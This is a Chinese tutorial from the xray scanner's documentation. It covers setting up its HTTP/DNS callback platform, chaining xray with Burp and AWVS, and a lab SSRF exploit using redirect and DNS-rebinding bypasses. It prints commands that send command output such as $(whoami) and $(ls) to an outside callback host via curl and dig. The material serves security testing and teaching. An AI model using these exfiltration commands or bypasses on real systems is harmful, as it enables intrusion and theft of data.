---
title: 高级用法
description: 'xray 的一些联动场景、优化方案以及反连部署'
---

## 部署反连平台（Reverse）

### 为什么我们需要反连平台（Why）
在进行漏洞检测的时候，我们会发现有很多的漏洞在执行了一些命令后，从表面上看没有任何回应的，比如命令执行漏洞，可以让目标执行读取文件的命令等，但由于前端并没有对应的展示，导致我们并不能知道文件是否成功读取，也就不知道命令是否执行成功。同时还有向经典的log4j rce，fastjson，ssrf等，都是没有回显的漏洞，那么当面对这类的漏洞，我们就需要一个反连平台，通过让目标执行`ping`、`curl`等命令，对反连平台发起请求，反连平台在接受到请求后，就能告诉我们，命令触发了，也就代表了漏洞存在了。
所以当我们想要比较完备的对一个系统进行测试，反连平台的利用一定是必不可少的。所以本文将着重讲述xray的反连平台如何部署搭建，配置文件如何修改，如何进行调试，并使用实际存在的漏洞进行举例。
### 视频教程（Video tutorial）

<iframe src="//player.bilibili.com/player.html?bvid=BV1ED4y1v7NK&high_quality=1&danmaku=0&autoplay=0&poster=1" width="100%" height="500" scrolling="no" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe>

### 准备工作（Preliminary）
#### 云服务器（Cloud server）
##### Ubuntu 20.04

安全策略：开启反连平台对外端口，开启53端口（UDP协议）
也就是修改安全组策略，将53端口开放，⚠️**注意**，协议类型一定要是**UDP**

![rev-1.png](/images/tools/xray/reverse/rev-1.png)

然后将需要对外开放的，部署反连平台的端口进行开放，比如8777，⚠️**注意**，该端口的协议类型是**TCP**

![rev-2.png](/images/tools/xray/reverse/rev-2.png)

##### 解决53端口被systemd-resolve占用的问题
首先使用以下命令确认端口占用情况
`sudo netstat -nultp`
在确认被占用后，可以执行如下命令停用systemd-resolved
`sudo systemctl stop systemd-resolved`
编辑resolved.conf
`sudo vim /etc/systemd/resolved.conf`
将文件中的对应内容改为如下内容
```yaml
[Resolve]
DNS=x.x.x.x         #取消注释，增加dns，此处的值可以填写你的云服务器公网IP
#FallbackDNS=
#Domains=
#LLMNR=no
#MulticastDNS=no
#DNSSEC=no
#DNSOverTLS=no
#Cache=no-negative
DNSStubListener=no    #取消注释，把yes改为no
#ReadEtcHosts=yes
```
修改完成后运行如下命令即可解除占用
`sudo ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf`

#### 域名（Domain）
**以下的ip请替换为准备好的云服务器的公网ip**

1. 仅配置如图所示的内容：

![rev-3.png](/images/tools/xray/reverse/rev-3.png)

不做其他任何变动，同时配置文件填写好，在启动后，**支持http/rmi的反连**，dns**仅支持**在使用**dig**或者**nslookup**时，**指定IP解析**的情况下，接收到请求。
也就是说，**执行ping/curl命令时**，反连平台并**没有**办法收到dns解析记录。
如果想要让反连平台的dns功能也正常工作，应进行如下操作：

<AccordionGroup>
    <Accordion title="腾讯云">
        1. 自定义DNS Host

        ![rev-4.png](/images/tools/xray/reverse/rev-4.png)

        2. 修改域名的DNS解析

        ![rev-5.png](/images/tools/xray/reverse/rev-5.png)

        3. 修改完成后，需要10分钟到几小时不等的时间生效，时间越久，部署效果越好
    </Accordion>
    <Accordion title="阿里云">
        1. 自定义DNS Host

        ![rev-6.png](/images/tools/xray/reverse/rev-6.png)
        ![rev-7.png](/images/tools/xray/reverse/rev-7.png)

        2. 修改域名的DNS解析

        ![rev-8.png](/images/tools/xray/reverse/rev-8.png)

        3. 修改完成后，需要10分钟到几小时不等的时间生效，时间越久，部署效果越好
    </Accordion>
</AccordionGroup>

### 开始部署（Deployments）
连接上远程服务器，处理完53端口占用问题，上传最新版的xray，并运行一下生成配置文件，反连平台部分按照以下进行修改

<AccordionGroup>
    <Accordion title="独立远程服务端">
        **以下配置文件中的ip请替换为云服务器对应的公网ip**

        <Tabs>
            <Tab title="服务端">
                ```yaml
                # 反连平台配置，更多解释见 https://docs.xray.cool/#/configration/reverse
                # 注意: 默认配置为禁用反连平台，这是无法扫描出依赖反连平台的漏洞，这些漏洞包括 fastjson，ssrf 以及 poc 中依赖反连的情况等
                reverse:
                db_file_path: "test.db"        # 反连平台数据库文件位置, 这是一个 KV 数据库
                token: "xxxxx"                      # 反连平台认证的 Token, 独立部署时不能为空
                http:
                enabled: true
                listen_ip: 0.0.0.0
                listen_port: "8777"
                ip_header: ""                # 在哪个 http header 中取 ip，为空代表从 REMOTE_ADDR 中取
                dns:
                enabled: true
                listen_ip: 0.0.0.0
                domain: "xxxxx.com"      # 此处填写刚才准备好的域名，如果没有准备启动dns，没有准备域名，请不要填写
                is_domain_name_server: true        # 是否修改了域名的 ns 为反连平台，如果是，那 nslookup 等就不需要指定 dns 了
                resolve:                            # DNS 静态解析规则
                - type: A                           # A, AAAA, TXT 三种
                record: localhost
                value: 127.0.0.1
                ttl: 60
                client:
                remote_server: false                # 是否是独立的远程 server，如果是要在下面配置好远程的服务端地址
                http_base_url: "http://8.130.41.223:8777"                   # 默认将根据 ListenIP 和 ListenPort 生成，该地址是存在漏洞的目标反连回来的地址, 当反连平台前面有反代、绑定域名、端口映射时需要自行配置
                dns_server_ip: "8.130.41.223"                   # 和 http_base_url 类似，实际用来访问 dns 服务器的地址
                # 如果没有准备启动dns，没有准备域名，请不要填写
                ```
            </Tab>
            <Tab title="客户端">
                ```yaml
                # 反连平台配置，更多解释见 https://docs.xray.cool/#/configration/reverse
                # 注意: 默认配置为禁用反连平台，这是无法扫描出依赖反连平台的漏洞，这些漏洞包括 fastjson，ssrf 以及 poc 中依赖反连的情况等
                reverse:
                db_file_path: ""        # 反连平台数据库文件位置, 这是一个 KV 数据库
                token: "xxxxx"                      # 反连平台认证的 Token, 独立部署时不能为空
                http:
                enabled: false
                listen_ip: 0.0.0.0
                listen_port: "8777"
                ip_header: ""                # 在哪个 http header 中取 ip，为空代表从 REMOTE_ADDR 中取
                dns:
                enabled: false
                listen_ip: 0.0.0.0
                domain: "xxxxx.com"      # 此处填写刚才准备好的域名，如果没有准备启动dns，没有准备域名，请不要填写
                is_domain_name_server: false        # 是否修改了域名的 ns 为反连平台，如果是，那 nslookup 等就不需要指定 dns 了
                resolve:                            # DNS 静态解析规则
                - type: A                           # A, AAAA, TXT 三种
                record: localhost
                value: 127.0.0.1
                ttl: 60
                client:
                remote_server: true                # 是否是独立的远程 server，如果是要在下面配置好远程的服务端地址
                http_base_url: "http://8.130.41.223:8777"                   # 默认将根据 ListenIP 和 ListenPort 生成，该地址是存在漏洞的目标反连回来的地址, 当反连平台前面有反代、绑定域名、端口映射时需要自行配置
                dns_server_ip: "8.130.41.223"                   # 和 http_base_url 类似，实际用来访问 dns 服务器的地址
                # 如果没有准备启动dns，没有准备域名，请不要填写
                ```
            </Tab>
        </Tabs>

    </Accordion>
    <Accordion title="非独立远程服务端">
        **以下的ip请替换为准备好的云服务器的公网ip**

        <Warning>当前版本非独立远程服务端的部署，在添加了DNS后，被动代理模式会出现无法扫描的BUG，建议暂时使用独立远程服务端进行部署</Warning>

        ```yaml
        # 反连平台配置，更多解释见 https://docs.xray.cool/#/configration/reverse
        # 注意: 默认配置为禁用反连平台，这是无法扫描出依赖反连平台的漏洞，这些漏洞包括 fastjson，ssrf 以及 poc 中依赖反连的情况等
        reverse:
        db_file_path: "test.db"        # 反连平台数据库文件位置, 这是一个 KV 数据库
        token: ""                      # 反连平台认证的 Token, 独立部署时不能为空
        http:
        enabled: true
        listen_ip: 0.0.0.0
        listen_port: "8777"
        ip_header: ""                # 在哪个 http header 中取 ip，为空代表从 REMOTE_ADDR 中取
        dns:
        enabled: true
        listen_ip: 0.0.0.0
        domain: "xxxxx.com"      # 此处填写刚才准备好的域名，如果没有准备启动dns，没有准备域名，请不要填写
        is_domain_name_server: true        # 是否修改了域名的 ns 为反连平台，如果是，那 nslookup 等就不需要指定 dns 了
        resolve:                            # DNS 静态解析规则
        - type: A                           # A, AAAA, TXT 三种
        record: localhost
        value: 127.0.0.1
        ttl: 60
        client:
        remote_server: false                # 是否是独立的远程 server，如果是要在下面配置好远程的服务端地址
        http_base_url: "http://8.130.41.223:8777"                   # 默认将根据 ListenIP 和 ListenPort 生成，该地址是存在漏洞的目标反连回来的地址, 当反连平台前面有反代、绑定域名、端口映射时需要自行配置
        dns_server_ip: "8.130.41.223"                   # 和 http_base_url 类似，实际用来访问 dns 服务器的地址
        # 如果没有准备启动dns，没有准备域名，请不要填写
        ```
    </Accordion>
</AccordionGroup>

### 使用方式（Usage）

<AccordionGroup>
    <Accordion title="独立远程服务端">
        1. 将xray放置于存在公网ip的服务器上，并按照上述进行配置。
        2. 安装screen，并使用screen创建一个新的视窗，并将反连平台运行在新的视窗中，这样在退出ssh连接后，反连平台将一直保持运行，操作如下

        ```yaml
        apt update
        apt install screen
        screen -R reverse
        ```

        3. 这样将进入到名为reverse的视窗中，执行`./xray reverse`启动反连平台，可以输入exit退出视窗
        4. 使用screen -ls可以查看当前存在的视窗，并使用`screen -r {{id}}` 进入视窗
        5. 然后在本地将客户端的配置配置好，启动客户端即可。
    </Accordion>
    <Accordion title="非独立远程服务端">
        1. 将xray放置于存在公网ip的服务器上，并按照上述进行配置。
        2. 配置完成后，直接在该服务器上进行操作，反连将可以正常运行
    </Accordion>
</AccordionGroup>

### 生效测试（Entry-into-force Testing）
在服务端启动一个xray reverse，应该能看到这样的界面：

![rev-9.png](/images/tools/xray/reverse/rev-9.png)

访问webUI后的链接即可访问到反连平台：

<AccordionGroup>
    <Accordion title="HTTP">
        ![rev-10.png](/images/tools/xray/reverse/rev-10.png)
        ![rev-11.png](/images/tools/xray/reverse/rev-11.png)

        点击复制后，到命令行中执行

        ![rev-12.png](/images/tools/xray/reverse/rev-12.png)

        可以看到存在返回，同时查看服务端那边的信息，可以看到：

        ![rev-13.png](/images/tools/xray/reverse/rev-13.png)
        ![rev-14.png](/images/tools/xray/reverse/rev-14.png)
    </Accordion>

    <Accordion title="DNS">
        ![rev-15.png](/images/tools/xray/reverse/rev-15.png)

        如果是刚部署好，可以首先使用nslookup进行测试

        ![rev-16.png](/images/tools/xray/reverse/rev-16.png)
        ![rev-17.png](/images/tools/xray/reverse/rev-17.png)

        如果已经有一段时间了，则可以使用ping命令

        ![rev-18.png](/images/tools/xray/reverse/rev-18.png)
        ![rev-19.png](/images/tools/xray/reverse/rev-19.png)

        之所以能接收到解析，是因为此时已经将这个机器设置成了这个域名的dns服务器，那么当别人去请求这些生成的域名的时候，dns查询请求就会到这个服务器上，那么这个时候我们就能知道，有人正在查询对应的域名，从而可以证明poc被触发。
        **注：**为了使得反连平台的可读性，它只会记录固定规则生成的链接的信息
        例如上图中有7个dns请求，在反连平台中就只会显示5个，ns1，ns2的那个并不会被记录下来

        ![rev-20.png](/images/tools/xray/reverse/rev-20.png)
    </Accordion>
</AccordionGroup>


### 插件测试（Plugin Testing）
以下测试考虑到大部分人的情况，将一律采用客户端+服务端的形式进行测试，同时在客户端上挂一个burp进行抓包查看详细的发包细节

<AccordionGroup>
    <Accordion title="log4j">
        靶场：vulfocus上的log4j的第一个靶场做测试
        命令：`./xray_darwin_arm64 ws --poc poc-go-apache-log4j2-rce --basic [http://123.58.224.8:32750](http://123.58.224.8:32750)`

        ![rev-21.png](/images/tools/xray/reverse/rev-21.png)
        ![rev-22.png](/images/tools/xray/reverse/rev-22.png)

        该插件默认使用dns进行检测，如果想不用dns进行检测，可以在配置文件中，将domain置空，同时将dns_server_ip置空。

        ![rev-23.png](/images/tools/xray/reverse/rev-23.png)
        ![rev-24.png](/images/tools/xray/reverse/rev-24.png)
    </Accordion>
    <Accordion title="fastjson">
        靶场：vulfocus的fastjson 代码执行 （CNVD-2019-22238）
        命令：`./xray_darwin_arm64 ws --plug fastjson --url [http://123.58.224.8:52772](http://123.58.224.8:52772)`

        ![rev-25.png](/images/tools/xray/reverse/rev-25.png)
    </Accordion>
</AccordionGroup>

### 常见问题排查（Troubleshooting）

1. 本地客户端报错，连接不上服务端的反连平台
    1. 请检查客户端与服务端是否可以正常通信
    2. 请检查客户端与服务端的token是否一致
    3. 请检查客户端与服务端使用的xray版本是否一致
    4. 请检查客户端与服务端所写的端口是否一致
    5. 请检查服务端存在的云服务器的对应端口是否开放（安全组策略，iptables，端口占用等）
2. DNS反连无法使用
    1. 请检查域名配置是否正确，是否已经设置dns host，自定义dns解析服务器
    2. 请检查客户端与服务端的配置文件中的域名填写正确

## 使用 Burp 进行联动

作者 [Lz1y](https://github.com/Lz1y)

在实际测试过程中，除了被动扫描，也时常需要手工测试。这里使用 Burp 的原生功能与 xray 建立起一个多层代理，让流量从 Burp 转发到 xray 中。

首先 xray 建立起 webscan 的监听

![](/images/tools/xray/burp/1.jpg)

进入 Burp 后，打开 `User options` 标签页，然后找到 `Upstream Proxy Servers` 设置。

点击 `Add` 添加上游代理以及作用域，`Destination host`处可以使用`*`匹配多个任意字符串，`?`匹配单一任意字符串，而上游代理的地址则填写 xray
的监听地址。

![](/images/tools/xray/burp/2.jpg)

接下来，在浏览器端使用 Burp 的代理地址

![](/images/tools/xray/burp/3.jpg)

此时，请求已经通过了 Burp

![](/images/tools/xray/burp/4.jpg)

转发到了 xray 中

![](/images/tools/xray/burp/5.jpg)

至此，联动成功。

## 使用 awvs爬虫 进行联动

awvs 的爬虫很好用，支持表单分析和单页应用的爬取，xray 的扫描能力比较强，速度也更快。awvs 和 xray 搭配使用则是如虎添翼。这里演示的是扫描 awvs 的在线靶站 http://testphp.vulnweb.com/

首先启动 xray 的被动代理，下面的命令将启动一个监听在所有网卡 1111 端口的 HTTP 代理, 并将扫描结果保存在 `awvs.html` 内。

```
./xray webscan --listen 0.0.0.0:1111 --html-output awvs.html
```

以 awvs 12 web 版为例，登入管理页后，点击 `Targets`, 然后点击 `Add Target` 添加扫描目标:

![](/images/tools/xray/awvs/add-target.jpg)

然后切换到 `HTTP` 的部分，填写 xray 的 HTTP 代理。

![](/images/tools/xray/awvs/proxy-server.jpg)

地址需要根据实际情况填写，需要填写为 awvs 所在机器（容器）内能够访问到 xray 代理的地址。如果 xray 在外网，则填写为外网主机的 IP 地址。端口填写为上面启动时设置的端口号。

其他项可以按需调整或保持默认，然后点击 `scan` 按钮，按图示选择 `Crawl Only` 即仅使用爬虫，然后点击 Create Scan 就可以开始扫描了。

![](/images/tools/xray/awvs/scan.jpg)

检查 xray 的界面有没有在扫描，如果有类似下图的结果说明工作正常，等待扫描完成即可。

![](/images/tools/xray/awvs/xray-result.jpg)

扫描完成后可以查看 `avws.html` 查看漏洞详情。

## 使用 反连平台挖掘和验证 SSRF

### 目标是什么（Target）

在 https://github.com/virusdefender/ssrf-app 提供了一个 ssrf 的实例程序，`docker-compose build && docker-compose up` 之后，浏览器访问 `http://vuln.net:8000/?url=http://example.com`，系统就会抓取指定的地址的网页并返回，就可以看到和直接访问 `http://example.com` 一样的页面。

要注意的是，vuln.net 是我绑定的 host 到 docker 容器的 IP，我使用的 docker for mac，ip 为 `127.0.0.1`，这其实是经过端口转发的，后端服务器实际并不在我本地，这里可以看实际情况去修改。

![](/images/tools/xray/reverse_server_ssrf/15679032465908.jpg)

另外已知在 `/api/internal/secret` 上存放了一个 secret api 服务，目标就是去访问它然后获取 secret，直接访问当然是不行了，会提示 IP 不在允许范围内。

首先的思路就是使用抓取网页的 api 去访问 secret api，所以先尝试将 `url` 参数换成内网 IP，然后访问查看。

<AccordionGroup>
    <Accordion title="直接访问 127.0.0.1 和使用 localhost 域名">
        第一个尝试的当然是 `127.0.0.1`，但是访问 `http://vuln.net:8000/?url=http://127.0.0.1:8000` 却提示 `127.0.0.1 is forbidden`，尝试使用 `localhost` 域名绕过，也是同样的提示，怀疑后端有尝试去解析 ip 然后做验证。

        ![](/images/tools/xray/reverse_server_ssrf/15679036352485.jpg)

        ![](/images/tools/xray/reverse_server_ssrf/15679036566098.jpg)
    </Accordion>
    <Accordion title="尝试扫内网吧">
        如果更换为其他的内网 ip，会提示连接超时 `HTTPConnectionPool(host='192.168.1.1', port=8000): Max retries exceeded with url: / (Caused by ConnectTimeoutError(, 'Connection to 192.168.1.1 timed out. (connect timeout=2)'))`，当然这也是探测内网 ip 和端口是否存在的一种特征。
        但是经过尝试，常见的 IP 和端口都是超时的，服务器应该是没有内网的（此处应该写一个脚本去扫描更多的 IP 和端口）。所以重点就在于如何绕过对 `127.0.0.1` 的限制了。
    </Accordion>
    <Accordion title="看看 IPv6">
        首先是尝试使用 IPv6 去绕过，访问 `http://vuln.net:8000/?url=http://[::1]:8000`，如果服务器监听了 IPv6 的地址，就可以绕过，因为访问的确实不是 `127.0.0.1`。但是经过测试发现还是报错，`[Errno -2] Name or service not known`，可能后端有一些函数是不支持 IPv6 的，像是将 `[::1]` 按照一个域名去解析了，所以这条路走不通了。
    </Accordion>
    <Accordion title="30x 跳转也许可以">
        接下来是利用 30x 跳转去绕过，因为看上面的报错信息，后端应该是 Python，Python 的 requests 等库都是默认允许跳转的，如果可以提供一个非 `127.0.0.1` 的 url，然后访问的时候返回一个 302 跳转到 `127.0.0.1` 上去就可以了。我们需要一个可以方便的自定义 http response 的平台，一种思路就是配置一个 Nginx，结合配置文件或者 Lua 脚本可以完全的实现各种自定义，但是稍有些麻烦，这时候我们就应该请出 xray 自带的反连平台了，它可以方便的在网页上配置我们期望的东西。
    </Accordion>
</AccordionGroup>

### 使用 xray 自带的反连平台

<AccordionGroup>
    <Accordion title="如何配置">
        首先去 [GitHub](https://github.com/chaitin/xray/releases) 下载最新的 xray 二进制文件，然后运行 `./xray help` 让 xray 生成一个默认的配置文件 `config.yaml`。我们需要在这个配置文件中配置反连平台的一些参数，默认是配置如下。

        ```yaml
        reverse:
        db_file_path: "./xray.db"
        token: ""
        http:
        enabled: true
        listen_ip: 127.0.0.1
        listen_port: ""
        dns:
        enabled: false
        listen_ip: 127.0.0.1
        domain: ""
        # 静态解析规则
        resolve:
        - type: A # A, AAAA, TXT 三种
        record: localhost
        value: 127.0.0.1
        ttl: 60
        client:
        http_base_url: ""
        dns_server_ip: ""
        remote_server: false
        ```

        暂时只需要反连平台的 HTTP 相关功能，而不需要漏洞扫描和反连平台 DNS 相关的功能，所以只关心上面 DNS 以外的配置文件就足够了。

        为了让之前提到的存在 ssrf 漏洞的应用可以访问的到，我们将 xray 运行在一个公网 IP 的机器上，所以 xray 监听的 IP 等等都需要配置，将上面的配置修改如下。

        ```yaml
        reverse:
        # 数据库文件路径，默认不用修改。
        # 本文件只能一个进程访问，如果启动两个 xray 就需要指定不同的路径。
        db_file_path: "./xray.db"
        # 用于生成的 url 验证，否则反连平台的 IP 一旦泄露，任何人访问你的平台都会被记录访问记录。
        # 有了 token 可以限制生效范围，而且修改 token 就可以失效以前的 url。
        # 我们修改为一个自定义的值
        token: "imtoken1"
        http:
        enabled: true
        # 监听地址，我们在公网机器上需要修改为 `0.0.0.0`，让所有地址都可以访问
        # 注意不一定是机器的公网 IP，本机不一定拥有这个 IP，否则会出错
        listen_ip: "0.0.0.0"
        # 监听端口，我们使用 4445
        listen_port: "4445"
        # dns 部分没有修改
        client:
        # 指定 http 部分的访问地址，这里才应该是机器的公网 IP
        http_base_url: "http://140.143.224.171:4445"
        dns_server_ip: ""
        remote_server: false
        ```

        修改完成之后，运行 `./xray reverse`，就可以看到反连平台启动了。

        ```bash
        [INFO] 2019-09-08 09:25:02 +0800 [default:config.go:160] loading config from config.yaml
        reverse server base url: http://140.143.224.171:4445, token: imtoken1
        reverse server webUI: http://140.143.224.171:4445/cland/
        [DBUG] 2019-09-08 09:25:03 +0800 [default:reverse.go:40] reverse http server started, base url: http://140.143.224.171:4445, token: imtoken1
        [INFO] 2019-09-08 09:25:03 +0800 [reverse:http_server.go:118] starting reverse http server
        ```

        访问提示的地址 `http://140.143.224.171:4445/cland/` 就可以看到反连平台的的界面了。点击 `生成一个 URL` 就会提示输入 token。

        ![](/images/tools/xray/reverse_server_ssrf/15679060423634.jpg)
    </Accordion>
    <Accordion title="反连平台的 HTTP 访问记录功能">
        先按照页面上的提示先测试下反连平台的功能，运行 `curl -v http://140.143.224.171:4445/p/89acfe/H34v/`

        ```bash
        $ curl -v http://140.143.224.171:4445/p/89acfe/H34v/
        *   Trying 140.143.224.171...
        * TCP_NODELAY set
        * Connected to 140.143.224.171 (140.143.224.171) port 4445 (#0)
        > GET /p/89acfe/H34v/ HTTP/1.1
        > Host: 140.143.224.171:4445
        > User-Agent: curl/7.54.0
        > Accept: */*
        >
        < HTTP/1.1 200 OK
        < Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self'; media-src 'self'; frame-src 'self'; font-src 'self' data:; connect-src 'self'
        < Content-Type: application/json
        < X-Content-Type-Options: nosniff
        < X-Frame-Options: SAMEORIGIN
        < X-Xss-Protection: 1; mode=block
        < Date: Sun, 08 Sep 2019 01:28:16 GMT
        < Content-Length: 22
        <
        * Connection #0 to host 140.143.224.171 left intact
        {"code":0,"data":null}%
        ```

        然后在左边的 `HTTP` 一栏中就可以看到了访问记录

        ![](/images/tools/xray/reverse_server_ssrf/15679061607483.jpg)

        而且反连平台支持在 url 后面随意添加参数，比如 `http://140.143.224.171:4445/p/89acfe/H34v/$(whoami)`，这样在测试一些命令执行漏洞的时候，就很方便的将一些执行结果带出来。

        如果 url 位置的长度不够，还可以使用 POST 方法。比如 `curl -v http://140.143.224.171:4445/p/89acfe/H34v/ -d "$(ls)"` 就可以看到访问记录是这样的。

        ![](/images/tools/xray/reverse_server_ssrf/15679064342320.jpg)
    </Accordion>
    <Accordion title="反连平台指定 response 功能">
        话说回来，为了验证之前利用跳转进行绕过的思路，我们在 xray 的反连平台上创建一个 url，然后指定 status code 和 header 就可以了。在网页上配置起来也是非常的简单。

        ![](/images/tools/xray/reverse_server_ssrf/15679069339033.jpg)

        点击保存之后，我们先用 curl 测试下。

        ```bash
        $ curl -v http://140.143.224.171:4445/p/1cd0a7/3OGA/
        *   Trying 140.143.224.171...
        * TCP_NODELAY set
        * Connected to 140.143.224.171 (140.143.224.171) port 4445 (#0)
        > GET /p/1cd0a7/3OGA/ HTTP/1.1
        > Host: 140.143.224.171:4445
        > User-Agent: curl/7.54.0
        > Accept: */*
        >
        < HTTP/1.1 302 Found
        < Content-Type: text/html
        < Location: http://127.0.0.1:8000/api/internal/secret
        < Date: Sun, 08 Sep 2019 01:42:41 GMT
        < Content-Length: 0
        <
        * Connection #0 to host 140.143.224.171 left intact
        ```

        工作一切正常。
    </Accordion>
    <Accordion title="跳转可以绕过验证，成功~">
        访问 `http://vuln.net:8000/?url=http://140.143.224.171:4445/p/1cd0a7/3OGA/` 发现漏洞利用成功，查看反连平台的访问记录，也验证了之前的猜测，后端是一个 Python 的服务。

        ![](/images/tools/xray/reverse_server_ssrf/15679070964121.jpg)

        ![](/images/tools/xray/reverse_server_ssrf/15679070689596.jpg)
    </Accordion>
</AccordionGroup>

### 有什么其他的绕过么（bypass）

<AccordionGroup>
    <Accordion title="两次解析 IP 一定一样吗">
        我们这么怀疑有有依据的

        - Linux 的 `getaddrbyname` 等函数只会返回一个 IP，但是实际上一个域名是可以配置多条 IP 的，那这时候，如果返回 IP 的顺序是随机的，就可能被绕过。
        - 为了提高性能而且减轻 dns 服务器的负担，域名的解析记录都是有缓存时间的，就是 `TTL`，一般为 60s 或者 600s，但是也可以配置为 0，这样每次向 dns 服务器查询，dns 服务器都需要去这个域名的 ns 服务器重新查询。本条思路在实践中主要存在两个问题
        - 主流的公开的 ns 服务器都不能配置 `TTL` 为 0，只能使用自己的解析服务。
        - 很多 dns 服务器并不完全遵循 `TTL`，比如配置了 `TTL` 为 0 也会强制缓存一小段时间。经过验证，`8.8.8.8` 提供的 dns 服务器是完全遵循的。

    </Accordion>
    <Accordion title="6块钱买一个域名来测试">
        为了测试 dns rebinding 漏洞，我们需要去购买一个域名，当然是选择最便宜的了，反正使用没有任何区别，我是在阿里云购买的 `revc.xyz` 域名，一年只需要 6 块钱，如果不需要长期持有，第二年重新购买一个就足够了，因为续费是比较贵的。

        按照上面的思路，我们需要将这个域名的 ns 服务器修改为自己的，这时候我们可以再去借助 xray 自带的反连平台了，因为它也是支持作为 ns 服务器去解析域名的，去阿里云的管理界面修改就可以了。

        ![](/images/tools/xray/reverse_server_ssrf/15679085467078.jpg)

        然后遇到了拦路虎，ns 服务器必须是域名，而不能是 IP，这时候我们还需要再去买一个域名？
    </Accordion>
    <Accordion title="鸡生蛋还是蛋生鸡的问题">
        其实不是的，我们完全自己解析自己，也就是 `ns1.revc.xyz` 和 `ns2.revc.xyz` 作为 `revc.xyz` 的 ns 服务器。这时候有人可能有疑问，这不是鸡生蛋蛋生鸡的问题么，`ns1` 和 `ns2` 去哪里解析，这其实是 dns 提供的功能，添加 glue record，我们可以先不用了解细节，直接去配置即可。就在左侧导航栏的 `自定义 DNS Host` 里面。

        ![](/images/tools/xray/reverse_server_ssrf/15679086195905.jpg)

        我们配置 `ns1` 和 `ns2` 为服务器的 IP，然后回到上一个页面配置 ns 为 `ns1.revc.xyz` 和 `ns2.revc.xyz` 就可以了。然后注意下面的提示，我们还需要添加 `ns1` 和 `ns2` 的 A 记录。这些都可以在 xray 的反连平台中配置。

        编辑刚才的配置文件

        ```yml
        reverse:
        # 其他的项目没有修改 ...
        dns:
        enabled: true
        # 和之前 http 的 listen ip 含义一样，修改为 0.0.0.0
        listen_ip: "0.0.0.0"
        # 刚才注册的域名
        domain: "revc.xyz"
        # 静态解析规则，如果请求解析的域名在下面配置了，就直接返回对应的结果
        # dns rebinding 返回的 ip 是动态的
        # 示例配置文件的中的 localhost 是演示使用的，我们添加 ns1 和 ns2 的 A 记录
        resolve:
        - type: A
        record: ns1
        value: 140.143.224.171
        ttl: 60
        - type: A
        record: ns2
        ttl: 60
        value: 140.143.224.171
        client:
        dns_server_ip: "140.143.224.171"
        # 其他的项目没有修改 ...
        ```

        `./xray reverse` 启动，这时候可以看到提示信息多了一些，`dns server` 也启动了。
        ```
        [INFO] 2019-09-08 10:20:16 +0800 [default:config.go:160] loading config from config.yaml
        reverse server base url: http://140.143.224.171:4445, token: imtoken1
        reverse server webUI: http://140.143.224.171:4445/cland/
        [DBUG] 2019-09-08 10:20:16 +0800 [default:reverse.go:40] reverse http server started, base url: http://140.143.224.171:4445, token: imtoken1
        [DBUG] 2019-09-08 10:20:16 +0800 [default:reverse.go:52] reverse dns started
        [INFO] 2019-09-08 10:20:16 +0800 [reverse:dns_server.go:167] starting reverse dns server
        [INFO] 2019-09-08 10:20:16 +0800 [reverse:http_server.go:118] starting reverse http server
        ```

        要注意的是 dns 服务需要监听 UDP 53 端口，需要 root 权限而且记得在防火墙中放行。
    </Accordion>
    <Accordion title="反连平台可以解析 *.revc.xyz 的任意域名了">
        回到界面上，点击 `生成一个域名`，我们先来验证一下之前的配置有没有生效，因为 ns 记录大概需要几个小时才能全球生效，当然如果指定了 dns 服务器为自己的的话，就不需要了。
        ```bash
        $dig ns1.revc.xyz A @140.143.224.171

        ; <<>> DiG 9.10.6 <<>> ns1.revc.xyz A @140.143.224.171
        ;; global options: +cmd
        ;; Got answer:
        ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 852
        ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
        ;; WARNING: recursion requested but not available

        ;; QUESTION SECTION:
        ;ns1.revc.xyz.			IN	A

        ;; ANSWER SECTION:
        ns1.revc.xyz.		60	IN	A	140.143.224.171

        ;; Query time: 75 msec
        ;; SERVER: 140.143.224.171#53(140.143.224.171)
        ;; WHEN: Sun Sep 08 10:22:23 CST 2019
        ;; MSG SIZE  rcvd: 58
        ```

        可以看出来 ns1 的解析记录是对的，这个是我们配置文件中的静态解析规则。

        在界面上可以生成一个新域名，如果我们不需要 dns rebinding 的功能，只需要查看解析记录的话，那和之前的 HTTP 访问记录功能没有太大差别，比如 `dig p-9fd889-lzyk.$(whoami).revc.xyz A@140.143.224.171` 就可以看到左侧 DNS 一栏中的记录了。

        ![](/images/tools/xray/reverse_server_ssrf/15679095622627.jpg)

        实际解析的域名中间的部分就是执行命令的结果。
    </Accordion>
    <Accordion title="dns rebinding 也可以绕过验证，成功~">
        话说回来，为了验证我们之前利用 dns rebinding 进行绕过的思路，我们在 xray 的反连平台上创建一个 域名，然后指定两次不同的解析 IP 而且 TTL 为 0 就可以了。在网页上配置起来也是非常的简单。

        ![](/images/tools/xray/reverse_server_ssrf/15679097232155.jpg)

        点击保存之后，同样是先本地测试一下。

        ```bash
        $dig p-04f887-2kua.revc.xyz A @140.143.224.171

        ; <<>> DiG 9.10.6 <<>> p-04f887-2kua.revc.xyz A @140.143.224.171
        ;; global options: +cmd
        ;; Got answer:
        ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 35
        ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
        ;; WARNING: recursion requested but not available

        ;; QUESTION SECTION:
        ;p-04f887-2kua.revc.xyz.		IN	A

        ;; ANSWER SECTION:
        p-04f887-2kua.revc.xyz.	0	IN	A	1.2.3.4

        ;; Query time: 54 msec
        ;; SERVER: 140.143.224.171#53(140.143.224.171)
        ;; WHEN: Sun Sep 08 10:29:25 CST 2019
        ;; MSG SIZE  rcvd: 78



        $dig p-04f887-2kua.revc.xyz A @140.143.224.171

        ; <<>> DiG 9.10.6 <<>> p-04f887-2kua.revc.xyz A @140.143.224.171
        ;; global options: +cmd
        ;; Got answer:
        ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 57001
        ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
        ;; WARNING: recursion requested but not available

        ;; QUESTION SECTION:
        ;p-04f887-2kua.revc.xyz.		IN	A

        ;; ANSWER SECTION:
